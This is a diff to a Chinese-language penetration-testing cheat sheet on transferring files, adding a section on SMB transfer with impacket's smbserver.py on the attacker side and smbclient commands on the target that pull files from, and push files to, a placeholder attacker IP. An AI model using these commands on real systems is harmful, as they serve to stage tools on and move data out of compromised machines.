@@ -87,11 +87,31 @@ bye
 scp 待传输文件的路径 目标用户命@目标IP:传输后保存的路径
 ```
 
-### 利用SMB传输
+### 利用SMB客户端传输
+
+前提条件：**已安装smbclient**
+
+```bash
+// 格式：
+smbclient //server_ip/share_name -U username
+```
+
+启动了一个 SMB 服务器，允许其他设备通过 SMB 协议与之通信，并在本地文件系统的当前目录下共享文件（本例为 "liodeus"）：
 
 ```bash
 // Attacker
 sudo smbserver.py -smb2support liodeus .
+```
+
+```bash
+// Target
+smbclient //攻方IP/liodeus -U 用户名
+// 连接成功后，查找对应文件，并下载到目标本机中(本例为 "liodeus")：
+ls
+get liodeus
+// 还可以从目标机器里上传文件到攻方SMB服务器：
+put 文件名
+quit
 ```
 
 
